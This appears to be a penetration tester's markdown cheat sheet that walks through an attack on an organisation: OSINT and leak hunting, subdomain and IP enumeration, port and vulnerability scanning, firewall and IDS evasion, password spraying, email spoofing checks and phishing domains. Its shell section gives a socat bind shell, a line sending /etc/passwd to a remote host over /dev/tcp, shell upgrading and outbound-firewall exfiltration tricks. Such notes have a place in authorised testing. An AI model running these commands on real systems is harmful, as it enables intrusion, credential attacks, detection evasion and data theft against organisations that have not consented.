## reconnaissance

### Information Gathering - Step 1
- Discover acquisitions
    https://www.crunchbase.com/discover/acquisitions

- search target's leaks
- search target in social medias (https://www.social-searcher.com/)
- search target in pastebin, github, gitlab
    * site:pastebin.com "target"
    * site:github.com "target"
    * site:gitlab.com "target"
    * site:trello.com "target"
    - https://github.com/search?q=site.com.br&type=code
    - search authenticated in pastebin
- search target in postman
- search buckets in search engine and https://buckets.grayhatwarfare.com/
- send email to inexistent account: NDN (non delivery notification) may show a useful descriptive error
- more at https://osintframework.com/

- [gather emails](web.md#gathering-users-emails-cpfs)
- password leaks: dehashed, scylla.so, breachdirectory.org, HIBP, pastebin, google

### Information Gathering - Step 2

- ?shmilylty/OneForAll

- get initial domains:
    * search engine + links in main websites
    * search registrant: 
        * registrant email in search engines
        * https://viewdns.info/reversewhois/
        * https://ti.defender.microsoft.com/
            - use wildcard to search
        * security trails (soa records)
    * host.io
    * searchdns.netcraft.com
    * search relations
        * https://builtwith.com/relationships/example.com
    * zone files: https://czds.icann.org/
        * ?https://opendata.rapid7.com/sonar.fdns_v2/
    * ?whoxy.com
    * ?search target cnpjs
    * ?robtex.com

- get subdomains: 
    * [subdomains.sh](subdomains.sh)
        * https://ti.defender.microsoft.com/
        * security trails
        * subfinder
        * amass
        * crt
        * theHarvester
    * https://developers.facebook.com/tools/ct
    * dnsdumpster.com
    * https://subdomains.whoisxmlapi.com
    * brute dns: recon-ng, gobuster, dnsrecon
    * zone transfer
        * dnsrecon -d example.com -t axfr
        * can affect just one ns of the target
        * host -l example.com ns.example.com
        * host -t AXFR example.com ns2.example.com
        * dig -t AXFR example.com @ns.example.com +short 
        * ?eldraco/domain_analyzer
        
- get ips:
    - shodan (hostname:example.com)
    - search.censys.io
    - recon-ng
    - search netblocks / ASN using known hosts
    - search netblocks / ASN via target name
        - https://bgp.he.net/
        - https://bgpview.io/
    - passivedns.mnemonic.no
    - ip address history
        - https://builtwith.com/relationships/example.com
        - https://ti.defender.microsoft.com/search/data/resolutions?query=example.com
        - passivedns.mnemonic.no
        - shodan
        - censys

- reverse dns lookup:
    * manual: host -t ptr IP 
    * prips RANGE_IP | hakrevdns
        - https://github.com/hakluke/hakrevdns
    * passivedns.mnemonic.no
    * recon-ng: reverse_resolve
    * tab DNS from https://bgp.he.net/net/{NETBLOCK}
    * bing ip:"1.1.1.1"
        - recon-ng
        - ?theharvester


### scanning
- subdomain takeover
    - [subdomains.sh](subdomains.sh)
    - look for:
        * amazonaws.com
        * cloudapp.net (azure)
        * azurewebsites.net
        * myshopify.com
        * github.io
        * herokuapp.com
        * cloudfront.net
        * home.blog (wordpress)
    - https://0xpatrik.com/subdomain-takeover-basics/ 
    1) search CNAMEs pointing to available domains or services
    2) search NS and MX's domains available

- get web services
    * `httpx -p http:80,8080,8000,8008,8888,9090,https:443,8443 -l hosts.txt -o web.txt`
- web screenshots
    * `gowitness file -f web.txt --user-agent "x" --debug ; gowitness server`
- port scan
    * tcp scan
        - `nmap -sS -Pn -vv --open -iL hosts.txt -oN nmap.fast.tcp.out -p 80,443,445,8000,8080,8443`
        - `nmap -Pn -D RND:xx -vv --open --script "not dos" --script-args 'newtargets,shodan-api.apikey=key' --top-ports X -iL hosts.txt -oN nmap.top.tcp.out`
        - `naabu -Pn -exclude-cdn -exclude-ports 80,443 -list hosts.txt -o naabu.tcp.txt`
    * udp scan
        - `nmap -sUV -Pn -vv --top-ports 10 --open -iL hosts.txt -oN nmap.udp.out`
    * ?masscan
- vulnerability scan
    * `nuclei -l web.txt -H 'User-Agent: x' -rl Y -o nuclei_results.txt`
    * nessus
- fuzzing web paths
    - ? `nmap --script=http-enum -iL web.txt -p80,443`
    - `for url in $(cat web.txt); do ffuf -H 'User-Agent: x' -c -recursion -recursion-depth 5 -w ../wordlist.txt -u $url/FUZZ -o "$(echo $url | sed 's/^http[s]\?...//' | sed 's/\///g')".ffuf.json ; done`
    - `cat site.ffuf.json | jq '.results | sort_by(.length) | .[]' | jq -C '{"length","status","words","lines","content-type","url"} | select (.status != 403)' | less -R`

- search devs repos
- [check repos](web.md#git)

### techniques against inbound network firewall
* ipv6
* set a source port
    * nmap --source-port 53
    * nc -p 53
* if internal: spoof mac
* if rce: remote port forwarding
* ?spoof ip

- bypass IDS/IPS: send ip spoofed packets with the true
    * ex: nmap -D RND:30

- traceroute to understand firewall (try traceroute udp & tcp with different ports, icmp)


## exploitation
- identify service version
    - nmap
    - manual approach
- search for exploits
    * https://www.exploit-db.com (or searchsploit)
    * github (search cve)
    * google
    * https://packetstormsecurity.com

- check default credentials
    - https://cirt.net/passwords 
    - https://open-sez.me/

- password spraying
    - Company@Year
    - o365spray
    - if found cred, try in vpn


### email
- SPF: identify servers allowed to send emails on behalf of the domain, should be configured with "-all" or use DMARC
    - "~all" can cause softfail, DMARC interprets SPF Softfail as a 'Pass' or 'Fail' depending on its email server settings
- host -t txt example.com

- DMARC policies
- Monitor, also called none policy, is the most basic DMARC policy and specified by “p=none.” The monitor enables monitoring and sends all emails (including failed authentication) to maintain regular traffic flow.
- Quarantine: The quarantine policy is specified by “p=quarantine,” which sends unqualified emails (those that fail authentication) to the recipient’s trash or spam folder. 
- Reject: The Reject policy prevents unqualified emails (those with failed authentication) from reaching their intended recipient. The reject policy, specified by “p=reject”.
- host -t txt _dmarc.example.com
    * https://emkei.cz/
    * ?sendgrid
- https://dmarcreport.com/content/spf-authentication-fails/

## shell
* netcat can be used with metasploit inline payloads
* socat, netcat alternative:
    * socat tcp4-listen:8080 EXEC:/bin/bash
    * socat - tcp4:duck.com:80

* bash native support to reverse shell: /dev/protocol/host/port
    * cat /etc/passwd >/dev/tcp/host/port

* encrypted shell is better to avoid detection
    * ncat has encryption support
    * openssl s_client -connect example.com:443

* upgrading shell
```bash
stty raw -echo
nc -lvp 1234
python -c 'import pty; pty.spawn("/bin/bash")'
```

### techniques against outbound network firewall
* try popular ports (443/tcp, 80/tcp, 53/udp, 22/tcp)
* ipv6
* if rce: 
    - dnscat2
    - write output in a public directory (web server, smb, ...) in the file system
* ?non tcp/udp protocols (icmp)


## phishing
- urlcrazy: look for domains to use in phishing attacks
